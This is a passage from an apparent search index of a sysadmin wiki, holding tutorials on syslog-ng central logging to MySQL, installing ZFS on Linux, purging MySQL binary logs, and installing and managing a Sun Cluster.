(\"/dev/log\"); internal(); }; # All network udp logs source s_network { udp( port(514) ); }; # Possible destinations # For all local logs destination d_localhost { file (\"/var/log/syslogng/$YEAR.$MONTH.$DAY/localhost/$FACILITY.log\"); }; # For all network logs destination d_network { # Possibility to use mySQL via a fifo file pipe (\"/tmp/mysql.pipe\" template (\"INSERT INTO logs(host, \\ facility, priority, level, tag, datetime, program,\\ msg) VALUES ('$HOST', '$FACILITY', '$PRIORITY', \\ '$LEVEL', '$TAG', '$YEAR-$MONTH-$DAY $HOUR:$MIN:$SEC', \\ '$PROGRAM', '$MSG');\\n\") template-escape(yes) ); file (\"/var/log/syslog-ng/$YEAR.$MONTH.$DAY/$HOST/reseau.log\"); }; # Filters filter f_local6 { facility(user); }; # Log processing itself log { source(s_localhost); destination(d_localhost); }; log { source(s_network); filter(f_local6); destination(d_network); }; The server configuration is now complete. But this is obviously not enough, you now need to specify to the target machines that they must transmit their syslog frames to this server. We will now explain how the basic syslogd daemon works, and configure it to properly redirect its frames.\nMySQL linkFor integration of logs in MySQL, here is an example of destination to add in the configuration file:\ndestination d_mysql { program( \"mysql -usyslogng -psyslogng syslogng -B \u003e /dev/null\" template(\"INSERT INTO logs (host, facility, priority, level, tag, date, time, program, msg) VALUES ( '$HOST', '$FACILITY', '$PRIORITY', '$LEVEL', '$TAG', '$YEAR-$MONTH-$DAY $HOUR:$MIN:$SEC', '$PROGRAM', '$MSG' );\\n\") template-escape(yes) ); }; The name of the destination here is d_mysql. -u: for the mysql username. -p: the mysql password. sysloggn: this is the database name here. logs: the name of the table that will receive the logs. Also add the logs table record in the syslogng database:\n$ mysql -uroot -p create database syslogng; use syslogng; create table logs ( host varchar(32) default NULL, facility varchar(10) default NULL, priority varchar(10) default NULL, level varchar(10) default NULL, tag varchar(10) default NULL, datetime time default NULL, program varchar(15) default NULL, msg text, seq int(10) unsigned NOT NULL auto_increment, PRIMARY kEY (seq)) TYPE=MyISAM; Now, let’s go back to the configuration file to configure at least one log:\nlog { source(s_all); filter(f_daemon); destination(d_mysql); destination(df_daemon); }; I’ve added my destination line here. This means that in addition to writing to a file located in /var/log, I’m going to send the logs to mysql. You may not need both lines. It’s up to you.\nFor proper reading and interpretation of logs, I invite you to follow the article explaining the setup of php-syslog-ng.\nTo test proper operation, I recommend proceeding as follows:\nRestart the ssh service on the client machine Check your log file /var/log/auth.log on the server. You should see logs from the remote machine arriving. In case you use name resolution and the DNS server does not resolve, insert your machine in /etc/hosts (this happens if you don’t see your SQL table incrementing) Clients linkFor clients, there are several syslogs and several OSes. We will therefore see how to do with almost everything.\nLinux with Syslog linkOn Linux and most distributions, Syslog is the default installed log server. That’s why we’re going to see how to send from syslog to syslog-ng the logs we’re interested in. Edit the /etc/syslog.conf file:\nauth,authpriv.* @192.168.0.193 auth,authpriv.* /var/log/auth.log *.*;auth,authpriv.none @192.168.0.193 *.*;auth,authpriv.none -/var/log/syslog #cron.* /var/log/cron.log daemon.* @192.168.0.193 daemon.* -/var/log/daemon.log kern.* @192.168.0.193 kern.* -/var/log/kern.log lpr.* @192.168.0.193 lpr.* -/var/log/lpr.log mail.* @192.168.0.193 mail.* -/var/log/mail.log user.* @192.168.0.193 user.* -/var/log/user.log uucp.* @192.168.0.193 uucp.* /var/log/uucp.log Here my Syslogng server has the IP address: 192.168.0.193. I specify a “@” to indicate redirection followed by the IP. I added lines for the server, because I want logs to be local and on the Syslogng server. If you don’t want them locally, delete the lines that are not in bold above. If you don’t want to go into detail and send everything, put this line:\n*.* @ip_server_syslog The “-” sign in front of log files means that you want to record logs asynchronously, which avoids bottlenecks.\nThen restart the service:\n/etc/init.d/sysklogd restart Linux with Syslogng linkFor a Linux client with a Syslog-ng server, simply define another destination:\ndestination dtcp_syslog_server { tcp(\"192.168.0.193\" port(514)); }; Here, I chose to send my logs in tcp to server 192.168.0.193 and port 514. However, this is just the destination, I’m not sending anything yet. That’s why we need to configure the logs:\n... log { source(s_all); filter(f_auth); destination(df_auth); destination(dtcp_syslog_server); }; # *.*;auth,authpriv.none -/var/log/syslog log { source(s_all); filter(f_syslog); destination(df_syslog); destination(dtcp_syslog_server); }; # daemon.* -/var/log/daemon.log log { source(s_all); filter(f_daemon); destination(df_daemon); destination(dtcp_syslog_server); }; # kern.* -/var/log/kern.log log { source(s_all); filter(f_kern); destination(df_kern); destination(dtcp_syslog_server); }; ... As you can see in the example above, you just need to add the recently configured destinations in the log. All that remains is to restart the service and that’s it :-)\nFAQ linkI/O error occurred while writing; fd=‘6’, error=‘Broken pipe (32)’ linkThis is most likely due to a connection problem to the database. Check your permissions and the credentials used in the configuration file.\nResources linkhttp://www.supinfo-projects.com/fr/2005/syslogng_2005/1/\nInstall a Syslog Server\n"
            }
        );
    index.add(
            {
                id:  377 ,
                href: "\/ZFS_On_Linux_:_Mise_en_place_de_ZFS_sous_Linux\/",
                title: "ZFS On Linux: Setting up ZFS on Linux",
                description: "A guide to installing and configuring ZFS filesystem on Linux distributions, including Ubuntu and Debian, with instructions for installation, configuration, and troubleshooting common issues.",
                content: " Introduction linkIf like me you’re a fan of this filesystem and find it a shame that it’s not natively available on Linux, there are currently several solutions to have this filesystem:\nSolaris/OpenSolaris: This is where ZFS comes from, but it remains a proprietary OS FreeBSD: The first port of ZFS appeared on FreeBSD, but we’re looking to use Linux here Kfreebsd: not really Linux (although Debian), but a FreeBSD kernel that allows ZFS to run with a Debian-style layer on top ZFS on Fuse: works on Linux, slow (because it runs on FUSE) but historically the first to be released for Linux (so supposedly the most mature) ZFS on Linux: newer, but has the advantage of running as a Linux kernel module I chose this last solution because I wanted to keep a Linux machine (Debian/Ubuntu) and have ZFS.\nInstallation linkPrerequisites linkTo install ZFS on Linux, we’ll need some dependencies:\naptitude install build-essential gawk alien fakeroot linux-headers-$(uname -r) install zlib1g-dev uuid-dev libblkid-dev libselinux1-dev Once these dependencies are installed, you’ll need to either get the list of packages and install them one by one, or use the Ubuntu repository (which is what we’ll do here).\nUbuntu linkIf you’re on Ubuntu, run this command to add the repository:\nadd-apt-repository ppa:zfs-native/stable If it doesn’t work, you might be missing this package:\napt-get install python-software-properties Debian linkFor Debian, you’ll need to add the following sources to your sources.list file (/etc/apt/sources.list):\ndeb http://ppa.launchpad.net/dajhorn/zfs/ubuntu natty main deb-src http://ppa.launchpad.net/dajhorn/zfs/ubuntu natty main ZFS linkTo install ZFS, all you need to do is:\naptitude update aptitude install ubuntu-zfs And that’s it, it’s installed! I’ll let you check the references of this page for how to use ZFS.\nFAQ linkMy server crashed because there was no more RAM available linkI already talk about this here, it’s because of the ZFS cache that needs to be customized. Here we’ll set it to 512 MB (/etc/modprobe.d/zfs.conf):\noptions zfs zfs_arc_max=536870912 References linkhttp://www.deimos.fr/blocnotesinfo/index.php?title=ZFS_:_Le_FileSystem_par_excellence\n"
            }
        );
    index.add(
            {
                id:  378 ,
                href: "\/Purger_les_mysql-bin_logs\/",
                title: "Purging MySQL Binary Logs",
                description: "This guide explains how to manage slow query logs and binary logs in MySQL, including how to flush, rotate, and purge logs to free up disk space.",
                content: "Introduction linkSlow query logs and binary logs are essential for several purposes in MySQL. In this documentation, we’ll see how to manage them. This is particularly useful when you’re running low on disk space.\nSlow Query Logs linkIntroduction linkSlow query logs are simply standard logs. They can be managed like standard server logs.\nFlush Logs linkTo flush logs, simply run this command:\necho \"\" \u003e slow-query.log Rotate Logs link mv slow-query.log slow-query.log.old mysqladmin flush-logs Binary Logs linkIntroduction linkYou might find a large number of bin files in the MySQL data directory called “server-bin.n” or mysql-bin.00000n, where n is an incrementing number. Usually /var/lib/mysql stores the binary log files. The binary log contains all statements that update data or potentially could have updated it. For example, a DELETE or UPDATE which matched no rows. Statements are stored in the form of events that describe the modifications. The binary log also contains information about how long each statement that updated data took to execute.\nWarning: do not delete these files manually or you won’t be able to restart your database!\nYou’ll get this kind of error messages:\n061031 17:38:48 mysqld started 061031 17:38:48 InnoDB: Started; log sequence number 14 1645228884 /usr/libexec/mysqld: File '/var/lib/mysql/mysql-bin.000017' not found (Errcode: 2) 061031 17:38:48 [ERROR] Failed to open log (file '/var/lib/mysql/mysql-bin.000017', errno 2) 061031 17:38:48 [ERROR] Could not open log file 061031 17:38:48 [ERROR] Can't init tc log 061031 17:38:48 [ERROR] Aborting 061031 17:38:48 InnoDB: Starting shutdown... 061031 17:38:51 InnoDB: Shutdown completed; log sequence number 14 1645228884 061031 17:38:51 [Note] /usr/libexec/mysqld: Shutdown complete 061031 17:38:51 mysqld ended The Purpose of MySQL Binary Log linkThe binary log has two important purposes:\nData Recovery: It may be used for data recovery operations. After a backup file has been restored, the events in the binary log that were recorded after the backup was made are re-executed. These events bring databases up to date from the point of the backup. High availability / replication: The binary log is used on master replication servers as a record of the statements to be sent to slave servers. The master server sends the events contained in its binary log to its slaves, which execute those events to make the same data changes that were made on the master. Disable MySQL Binlogging linkIf you are not replicating, you can disable binlogging by changing your my.ini or my.cnf file. Open your my.ini or /etc/my.cnf (/etc/mysql/my.cnf), find a line that reads “log_bin” and remove or comment the following lines:\n#log_bin = /var/log/mysql/mysql-bin.log #expire_logs_days = 10 #max_binlog_size = 100M Now restart MySQL.\nPurge Master Logs linkIf you ARE replicating, then you need to periodically RESET MASTER or PURGE MASTER LOGS to clear out the old logs as those files are necessary for the proper operation of replication. Use the following command to purge master logs:\nmysql -u root -p 'MyPassword' -e \"PURGE MASTER LOGS TO 'mysql-bin.03';\" or\nmysql -u root -p 'MyPassword' -e \"PURGE MASTER LOGS BEFORE '2008-12-15 10:06:06';\" Note: I recommend using the penultimate MySQL master log.\nYou may want MySQL to do it automatically. For that, change the configuration:\nexpire_logs_days = 14 Then restart the MySQL server.\nResources linkhttp://www.cyberciti.biz/faq/what-is-mysql-binary-log/\nhttp://dev.mysql.com/doc/refman/5.0/en/binary-log.html\nhttp://forums.mysql.com/read.php?10,78659,78660#msg-78660\n"
            }
        );
    index.add(
            {
                id:  379 ,
                href: "\/Installation_et_configuration_du_SUN_Cluster\/",
                title: "Installation and Configuration of SUN Cluster",
                description: "A comprehensive guide covering the installation and configuration of SUN Cluster, including requirements, network setup, maintenance and troubleshooting procedures.",
                content: "Introduction linkSolaris Cluster (sometimes Sun Cluster or SunCluster) is a high-availability cluster software product for the Solaris Operating System, created by Sun Microsystems.\nIt is used to improve the availability of software services such as databases, file sharing on a network, electronic commerce websites, or other applications. Sun Cluster operates by having redundant computers or nodes where one or more computers continue to provide service if another fails. Nodes may be located in the same data center or on different continents.\nThis Documentation has been released with:\nSun Solaris update 7 Sun Cluster 3.2u2 Requirements linkAll of the following items are required before installing Sun Cluster. Follow all these steps before installation.\nHardware linkTo make a real cluster, here is the required hardware list:\n2 nodes sun-node1 sun-node2 4 network cards 2 for Public interface (with IPMP on it) 2 for Private interface (for cluster: heartbeat \u0026 nodes information exchange) 1 disk array with 1 spare disk Partitioning linkWhile you install Solaris, you should make a slice called /globaldevices containing at least 512MB. This slice should be in UFS (ZFS does not work as global device at the moment).\nIf you didn’t create this slice during Solaris installation, you can:\nUse the format command to create a new slice Use newfs command to format filesystem as UFS Mount this filesystem with global option in /globaldevices Add it in /etc/vfstab, for example: /dev/did/dsk/d6s3 /dev/did/rdsk/d6s3 /global/.devices/node@2 ufs 2 no global Note: Since Sun Cluster 3.2 update 2, you don’t need /globaldevices anymore and use ZFS as default root system.\nHostname Configuration linkChange the hostname to match the cluster nomenclature you want: Changing Solaris hostname\nDo not forget to apply the same /etc/hosts file to all cluster nodes!!! And when you make changes, change it on every node!\nPatches linkUse Sun Update Manager if you have a graphical interface to update all the available packages. If you don’t have graphical interfaces, please install all available patches to avoid installation problems.\nIPMP Configuration linkYou need to configure at least 2 interfaces for your public network. Follow this documentation: IPMP Configuration\nYou don’t have to do it for your private network because it will be automatically done by the cluster during installation.\nActivate all network cards linkWith your 4 network cards, you should activate all your cards to be easily recognized during installation. First, run ifconfig -a to check if all your cards are plumbed. If not, enable them:\ntouch /etc/hostname.e1000g2 touch /etc/hostname.e1000g3 ifconfig e1000g2 plumb ifconfig e1000g3 plumb Remove RPC and Webconsole binding linkIf you have installed the latest Solaris version, you may encounter Node integration problems due to RPC binding. This is a new SUN security feature. As we need to allow communication between nodes, we need to disable binding on RPC protocol (and could do it for the webconsole as well). You should do this operation on each node.\nEnsure that the local_only property of rpcbind is set to false: svcprop network/rpc/bind:default If local_only is set to true, run these commands and refresh the service:\n$ svccfg svc:\u003e select network/rpc/bind svc:/network/rpc/bind\u003e setprop config/local_only=false svc:/network/rpc/bind\u003e quit svcadm refresh network/rpc/bind:default Now communication between nodes works.\nEnsure that the tcp_listen property of webconsole is set to true: svcprop /system/webconsole:console If tcp_listen is not true, run these commands and restart service:\n$ svccfg svc:\u003e select system/webconsole svc:/system/webconsole\u003e setprop options/tcp_listen=true svc:/system/webconsole\u003e quit /usr/sbin/smcwebserver restart It is needed for Sun Cluster Manager communication. To verify if the port is listening on *.6789 you can execute:\nnetstat -a If you want a faster solution to do those 2 things, use these commands:\nsvccfg -s network/rpc/bind setprop config/local_only=false svcadm refresh network/rpc/bind:default svccfg -s system/webconsole setprop options/tcp_listen=true /usr/sbin/smcwebserver restart Profile linkConfigure the root profile (~/.profile) or for all users (/etc/profile) by adding these lines:\nPATH=$PATH:/usr/cluster/bin/ Now refresh your configuration:\nsource ~/.profile or\nsource /etc/profile Ending linkRestart all your nodes when everything is finished.\nInstallation linkFirst of all, download the Sun Cluster package (normally in zip) and uncompress it on all nodes. You should have a “Solaris_x86” folder.\nNow launch the installer on all the nodes:\ncd /Solaris_x86 ./installer We’ll need to install Sun Cluster Core and Quorum (if we want to add more than 2 nodes now or later).\nConfiguration linkWizard configuration linkBefore launching installation, you should know there are 2 ways to configure all the nodes:\nOne by one All in one shot If you want to do all in one shot, you should exchange all root ssh public keys between all nodes.\nscinstall *** Main Menu *** Please select from one of the following (*) options: * 1) Create a new cluster or add a cluster node 2) Configure a cluster to be JumpStarted from this install server 3) Manage a dual-partition upgrade 4) Upgrade this cluster node 5) Print release information for this cluster node * ?) Help with menu options * q) Quit Option: Answer: 1\n*** New Cluster and Cluster Node Menu *** Please select from any one of the following options: 1) Create a new cluster 2) Create just the first node of a new cluster on this machine 3) Add this machine as a node in an existing cluster ?) Help with menu options q) Return to the Main Menu Option: Answer: 1\n*** Create a New Cluster *** This option creates and configures a new cluster. You must use the Java Enterprise System (JES) installer to install the Sun Cluster framework software on each machine in the new cluster before you select this option. If the \"remote configuration\" option is unselected from the JES installer when you install the Sun Cluster framework on any of the new nodes, then you must configure either the remote shell (see rsh(1)) or the secure shell (see ssh(1)) before you select this option. If rsh or ssh is used, you must enable root access to all of the new member nodes from this node. Press Control-d at any time to return to the Main Menu. Do you want to continue (yes/no) Answer: yes\n\u003e\u003e\u003e Typical or Custom Mode \u003c\u003c\u003c This tool supports two modes of operation, Typical mode and Custom. For most clusters, you can use Typical mode. However, you might need to select the Custom mode option if not all of the Typical defaults can be applied to your cluster. For more information about the differences between Typical and Custom modes, select the Help option from the menu. Please select from one of the following options: 1) Typical 2) Custom ?) Help q) Return to the Main Menu Option [1]: Answer: 2\n\u003e\u003e\u003e Cluster Name \u003c\u003c\u003c Each cluster has a name assigned to it. The name can be made up of any characters other than whitespace. Each cluster name should be unique within the namespace of your enterprise. What is the name of the cluster you want to establish ? Answer: sun-cluster\n\u003e\u003e\u003e Cluster Nodes \u003c\u003c\u003c This Sun Cluster release supports a total of up to 16 nodes. Please list the names of the other nodes planned for the initial cluster configuration. List one node name per line. When finished, type Control-D: Node name: sun-node1 Node name: sun-node2 Node name (Control-D to finish): ^D Enter the 2 node names and finish with Ctrl+D.\nThis is the complete list of nodes: sun-node1 sun-node2 Is it correct (yes/no) [yes]? Answer: yes\nAttempting to contact \"sun-node2\" ... done Searching for a remote configuration method ... done The secure shell (see ssh(1)) will be used for remote execution. Press Enter to continue: Answer: yes\n\u003e\u003e\u003e Authenticating Requests to Add Nodes \u003c\u003c\u003c Once the first node establishes itself as a single node cluster, other nodes attempting to add themselves to the cluster configuration must be found on the list of nodes you just provided. You can modify this list by using claccess(1CL) or other tools once the cluster has been established. By default, nodes are not securely authenticated as they attempt to add themselves to the cluster configuration. This is generally considered adequate, since nodes which are not physically connected to the private cluster interconnect will never be able to actually join the cluster. However, DES authentication is available. If DES authentication is selected, you must configure all necessary encryption keys before any node will be allowed to join the cluster (see keyserv(1M), publickey(4)). Do you need to use DES authentication (yes/no) [no]? Answer: no\n\u003e\u003e\u003e Network Address for the Cluster Transport \u003c\u003c\u003c The cluster transport uses a default network address of 172.16.0.0. If this IP address is already in use elsewhere within your enterprise, specify another address from the range of recommended private addresses (see RFC 1918 for details). The default netmask is 255.255.248.0. You can select another netmask, as long as it minimally masks all bits that are given in the network address. The default private netmask and network address result in an IP address range that supports a cluster with a maximum of 64 nodes and 10 private networks. Is it okay to accept the default network address (yes/no) [yes]? Answer: yes\nIs it okay to accept the default netmask (yes/no) [yes]? Answer: yes\n\u003e\u003e\u003e Minimum Number of Private Networks \u003c\u003c\u003c Each cluster is typically configured with at least two private networks. Configuring a cluster with just one private interconnect provides less availability and will require the cluster to spend more time in automatic recovery if that private interconnect fails. Should this cluster use at least two private networks (yes/no) [yes]? Answer: yes\n\u003e\u003e\u003e Point-to-Point Cables \u003c\u003c\u003c The two nodes of a two-node cluster may use a directly-connected interconnect. That is, no cluster switches are configured. However, when there are greater than two nodes, this interactive form of scinstall assumes that there will be exactly one switch for each private network. Does this two-node cluster use switches (yes/no) [yes]? Answer: no\n\u003e\u003e\u003e Cluster Transport Adapters and Cables \u003c\u003c\u003c You must configure the cluster transport adapters for each node in the cluster. These are the adapters which attach to the private cluster interconnect. Select the first cluster transport adapter for \"sun-node1\": 1) e1000g1 2) e1000g2 3) e1000g3 4) Other Option: Answer: 3\nAdapter \"e1000g3\" is an Ethernet adapter. Searching for any unexpected network traffic on \"e1000g3\" ... done Verification completed. No traffic was detected over a 10 second sample period. The \"dlpi\" transport type will be set for this cluster. Name of adapter on \"sun-node2\" to which \"e1000g3\" is connected? e1000g3 Select the second cluster transport adapter for \"sun-node1\": 1) e1000g1 2) e1000g2 3) e1000g3 4) Other Option: Answer: 2\nAdapter \"e1000g2\" is an Ethernet adapter. Searching for any unexpected network traffic on \"e1000g2\" ... done Verification completed. No traffic was detected over a 10 second sample period. Name of adapter on \"sun-node2\" to which \"e1000g2\" is connected? Answer: e1000g2\n\u003e\u003e\u003e Quorum Configuration \u003c\u003c\u003c Every two-node cluster requires at least one quorum device. By default, scinstall will select and configure a shared SCSI quorum disk device for you. This screen allows you to disable the automatic selection and configuration of a quorum device. The only time that you must disable this feature is when ANY of the shared storage in your cluster is not qualified for use as a Sun Cluster quorum device. If your storage was purchased with your cluster, it is qualified. Otherwise, check with your storage vendor to determine whether your storage device is supported as Sun Cluster quorum device. If you disable automatic quorum device selection now, or if you intend to use a quorum device that is not a shared SCSI disk, you must instead use clsetup(1M) to manually configure quorum once both nodes have joined the cluster for the first time. Do you want to disable automatic quorum device selection (yes/no) [no]? Answer: yes\n\u003e\u003e\u003e Global Devices File System \u003c\u003c\u003c Each node in the cluster must have a local file system mounted on /global/.devices/node@ before it can successfully participate as a cluster member. Since the \"nodeID\" is not assigned until scinstall is run, scinstall will set this up for you. You must supply the name of either an already-mounted file system or raw disk partition which scinstall can use to create the global devices file system. This file system or partition should be at least 512 MB in size. If an already-mounted file system is used, the file system must be empty. If a raw disk partition is used, a new file system will be created for you. The default is to use /globaldevices. Is it okay to use this default (yes/no) [yes]? Answer: yes\nTesting for \"/globaldevices\" on \"sun-node1\" ... done For node \"sun-node2\", Is it okay to use this default (yes/no) [yes]? Answer: yes\nIs it okay to create the new cluster (yes/no) [yes]? Answer: yes\n\u003e\u003e\u003e Automatic Reboot \u003c\u003c\u003c Once scinstall has successfully initialized the Sun Cluster software for this machine, the machine must be rebooted. After the reboot, this machine will be established as the first node in the new cluster. Do you want scinstall to reboot for you (yes/no) [yes]? Answer: yes\nDuring the cluster creation process, sccheck is run on each of the new cluster nodes. If sccheck detects problems, you can either interrupt the process or check the log files after the cluster has been established. Interrupt cluster creation for sccheck errors (yes/no) [no]? Answer: no\nThe Sun Cluster software is installed on \"sun-node2\". Started sccheck on \"sun-node1\". Started sccheck on \"sun-node2\". sccheck completed with no errors or warnings for \"sun-node1\". sccheck completed with no errors or warnings for \"sun-node2\". Configuring \"sun-node2\" ... done Rebooting \"sun-node2\" ... Waiting for \"sun-node2\" to become a cluster member ... Manual configuration linkHere is an example of setting up the first node and allowing another node:\nscinstall -i \\ -C PA-TLH-CLU-UAT-1 \\ -F \\ -T node=PA-TLH-SRV-UAT-1,node=PA-TLH-SRV-UAT-2,authtype=sys \\ -w netaddr=10.255.255.0,netmask=255.255.255.0,maxnodes=16,maxprivatenets=2,numvirtualclusters=1 \\ -A trtype=dlpi,name=nge2 -A trtype=dlpi,name=nge3 \\ -B type=switch,name=PA-TLH-SWI-IN-1 -B type=switch,name=PA-TLH-SWI-IN-2 \\ -m endpoint=:nge2,endpoint=PA-TLH-SWI-IN-1 \\ -m endpoint=:nge3,endpoint=PA-TLH-SWI-IN-2 \\ -P task=quorum,state=INIT Quorum linkIf you’ve made the installation with a quorum, you’ll need to set it up with the webremote or with these commands. First, you need to list all LUNs with DID format:\ndidadm -l 1 LD-TLH-SRV-UAT-1:/dev/rdsk/c0t0d0 /dev/did/rdsk/d1 2 LD-TLH-SRV-UAT-1:/dev/rdsk/c1t0d0 /dev/did/rdsk/d2 5 LD-TLH-SRV-UAT-1:/dev/rdsk/c2t201500A0B856312Cd31 /dev/did/rdsk/d5 5 LD-TLH-SRV-UAT-1:/dev/rdsk/c2t201400A0B856312Cd31 /dev/did/rdsk/d5 5 LD-TLH-SRV-UAT-1:/dev/rdsk/c3t202400A0B856312Cd31 /dev/did/rdsk/d5 5 LD-TLH-SRV-UAT-1:/dev/rdsk/c3t202500A0B856312Cd31 /dev/did/rdsk/d5 6 LD-TLH-SRV-UAT-1:/dev/rdsk/c5t600A0B800056312C000009CB4AAA2A14d0 /dev/did/rdsk/d6 7 LD-TLH-SRV-UAT-1:/dev/rdsk/c5t600A0B800056381A00000E0A4AAA2A14d0 /dev/did/rdsk/d7 Choose the LUN you wish to use for your quorum:\n/usr/cluster/bin/clquorum add /dev/did/rdsk/d6 Then, activate it:\n/usr/cluster/bin/clquorum enable /dev/did/rdsk/d6 To finish, you need to reset it:\n/usr/cluster/bin/clquorum reset Now you’re able to configure your cluster.\nNetwork linkCluster connections linkTo check cluster interconnect, please use this command:\nclinterconnect status To enable a network card interconnection:\nclinterconnect enable hostname:card example:\nclinterconnect enable localhost:e1000g0 Check network interconnect interfaces linkTo check if all interfaces are running, configure IPs on each of the private (cluster) IPs. Then broadcast a ping:\nping -s 10.255.255.255 You can change this private IP address range with your own (defaults are 172.16.0.255)\nCheck traffic linkUse the snoop command to see traffic, for example:\nsnoop -d example:\nsnoop -d nge0 192.168.76.2 Get Fiber Channel WWN linkTo get Fiber Channel identifiers, run this command:\nfcinfo hba-port HBA Port WWN: 2100001b32892934 OS Device Name: /dev/cfg/c2 Manufacturer: QLogic Corp. Model: 375-3356-02 Firmware Version: 4.04.01 FCode/BIOS Version: BIOS: 1.24; fcode: 1.24; EFI: 1.8; Serial Number: 0402R00-0906696990 Driver Name: qlc Driver Version: 20081115-2.29 Type: N-port State: online Supported Speeds: 1Gb 2Gb 4Gb Current Speed: 4Gb Node WWN: 2000001b32892934 HBA Port WWN: 2101001b32a92934 OS Device Name: /dev/cfg/c3 Manufacturer: QLogic Corp. Model: 375-3356-02 Firmware Version: 4.04.01 FCode/BIOS Version: BIOS: 1.24; fcode: 1.24; EFI: 1.8; Serial Number: 0402R00-0906696990 Driver Name: qlc Driver Version: 20081115-2.29 Type: N-port State: online Supported Speeds: 1Gb 2Gb 4Gb Current Speed: 4Gb Node WWN: 2001001b32a92934 Manage linkGet cluster state linkTo get cluster state, simply run the scstat command:\nscstat ------------------------------------------------------------------ -- Cluster Nodes -- Node name Status --------- ------ Cluster node: PA-TLH-SRV-PRD-1 Online Cluster node: PA-TLH-SRV-PRD-2 Online Cluster node: PA-TLH-SRV-PRD-3 Online Cluster node: PA-TLH-SRV-PRD-6 Online Cluster node: PA-TLH-SRV-PRD-4 Online Cluster node: PA-TLH-SRV-PRD-5 Online ------------------------------------------------------------------ -- Cluster Transport Paths -- Endpoint Endpoint Status -------- -------- ------ Transport path: PA-TLH-SRV-PRD-1:nge3 PA-TLH-SRV-PRD-6:nge3 Path online Transport path: PA-TLH-SRV-PRD-1:nge2 PA-TLH-SRV-PRD-6:nge2 Path online Transport path: PA-TLH-SRV-PRD-1:nge3 PA-TLH-SRV-PRD-2:nge3 Path online Transport path: PA-TLH-SRV-PRD-1:nge3 PA-TLH-SRV-PRD-5:nge3 Path online Transport path: PA-TLH-SRV-PRD-1:nge2 PA-TLH-SRV-PRD-2:nge2 Path online Transport path: PA-TLH-SRV-PRD-1:nge2 PA-TLH-SRV-PRD-5:nge2 Path online Transport path: PA-TLH-SRV-PRD-1:nge3 PA-TLH-SRV-PRD-4:nge3 Path online Transport path: PA-TLH-SRV-PRD-1:nge2 PA-TLH-SRV-PRD-4:nge2 Path online Transport path: PA-TLH-SRV-PRD-1:nge3 PA-TLH-SRV-PRD-3:nge3 Path online Transport path: PA-TLH-SRV-PRD-1:nge2 PA-TLH-SRV-PRD-3:nge2 Path online Transport path: PA-TLH-SRV-PRD-2:nge2 PA-TLH-SRV-PRD-5:nge2 Path online Transport path: PA-TLH-SRV-PRD-2:nge3 PA-TLH-SRV-PRD-3:nge3 Path online Transport path: PA-TLH-SRV-PRD-2:nge2 PA-TLH-SRV-PRD-4:nge2 Path online Transport path: PA-TLH-SRV-PRD-2:nge3 PA-TLH-SRV-PRD-6:nge3 Path online Transport path: PA-TLH-SRV-PRD-2:nge2 PA-TLH-SRV-PRD-3:nge2 Path online Transport path: PA-TLH-SRV-PRD-2:nge3 PA-TLH-SRV-PRD-5:nge3 Path online Transport path: PA-TLH-SRV-PRD-2:nge2 PA-TLH-SRV-PRD-6:nge2 Path online Transport path: PA-TLH-SRV-PRD-2:nge3 PA-TLH-SRV-PRD-4:nge3 Path online Transport path: PA-TLH-SRV-PRD-3:nge2 PA-TLH-SRV-PRD-5:nge2 Path online Transport path: PA-TLH-SRV-PRD-3:nge3 PA-TLH-SRV-PRD-6:nge3 Path online Transport path: PA-TLH-SRV-PRD-3:nge2 PA-TLH-SRV-PRD-4:nge2 Path online Transport path: PA-TLH-SRV-PRD-3:nge3 PA-TLH-SRV-PRD-5:nge3 Path online Transport path: PA-TLH-SRV-PRD-3:nge3 PA-TLH-SRV-PRD-4:nge3 Path online Transport path: PA-TLH-SRV-PRD-3:nge2 PA-TLH-SRV-PRD-6:nge2 Path online Transport path: PA-TLH-SRV-PRD-6:nge3 PA-TLH-SRV-PRD-5:nge3 Path online Transport path: PA-TLH-SRV-PRD-6:nge2 PA-TLH-SRV-PRD-5:nge2 Path online Transport path: PA-TLH-SRV-PRD-6:nge3 PA-TLH-SRV-PRD-4:nge3 Path online Transport path: PA-TLH-SRV-PRD-6:nge2 PA-TLH-SRV-PRD-4:nge2 Path online Transport path: PA-TLH-SRV-PRD-4:nge2 PA-TLH-SRV-PRD-5:nge2 Path online Transport path: PA-TLH-SRV-PRD-4:nge3 PA-TLH-SRV-PRD-5:nge3 Path online ------------------------------------------------------------------ -- Quorum Summary from latest node reconfiguration -- Quorum votes possible: 11 Quorum votes needed: 6 Quorum votes present: 11 -- Quorum Votes by Node (current status) -- Node Name Present Possible Status --------- ------- -------- ------ Node votes: PA-TLH-SRV-PRD-1 1 1 Online Node votes: PA-TLH-SRV-PRD-2 1 1 Online Node votes: PA-TLH-SRV-PRD-3 1 1 Online Node votes: PA-TLH-SRV-PRD-6 1 1 Online Node votes: PA-TLH-SRV-PRD-4 1 1 Online Node votes: PA-TLH-SRV-PRD-5 1 1 Online -- Quorum Votes by Device (current status) -- Device Name Present Possible Status ----------- ------- -------- ------ Device votes: /dev/did/rdsk/d28s2 5 5 Online ------------------------------------------------------------------ -- Device Group Servers -- Device Group Primary Secondary ------------ ------- --------- -- Device Group Status -- Device Group Status ------------ ------ -- Multi-owner Device Groups -- Device Group Online Status ------------ ------------- ------------------------------------------------------------------ ------------------------------------------------------------------ -- IPMP Groups -- Node Name Group Status Adapter Status --------- ----- ------ ------- ------ ------------------------------------------------------------------ Registering Resources linkYou can look at the available resources:\n$ clrt list SUNW.LogicalHostname:2 SUNW.SharedAddress:2 Here we need to use more resources like HA Storage (HAStoragePlus) and GDS:\nclrt register SUNW.HAStoragePlus clrt register SUNW.gds Now we can verify:\n$ clrt list SUNW.LogicalHostname:2 SUNW.SharedAddress:2 SUNW.HAStoragePlus:6 SUNW.gds:6 Creating Resource Group linkAn RG (Resource Group) can contain, for example, a VIP (Virtual IP or Logical Host):\nclrg create sun-rg You can also specify an RG on a specific node:\nclrg create -n sun-node1 sun-rg Creating Logical Host (VIP) Resource linkAll your requested VIPs should be in the /etc/hosts file on each node, e.g.:\n# # Internet host table # ::1 localhost 127.0.0.1 localhost 192.168.0.72 sun-node1 192.168.0.77 sun-node2 192.168.0.79 my_app1_vip 192.168.0.80 my_app2_vip Now, activate it:\nclrslh create -g sun-rg -h my_app1_vip my_app1_vip sun-rg: Resource group (created before) my_app1_vip: name of the VIP in the hosts files my_app1_vip: name of the VIP resource in cluster To specify on only one node:\nclrslh create -g sun-rg -h lh -N ipmp0sun-node1 my_app1_vip Creating FileSystem Resource linkOnce your LUNs have been created, be sure you can see all available DIDs on all nodes:\ndidadm -l and compare to the ‘format’ command. Everything should look similar. If not, please run these commands on all nodes:\ndidadm -C didadm -r This will 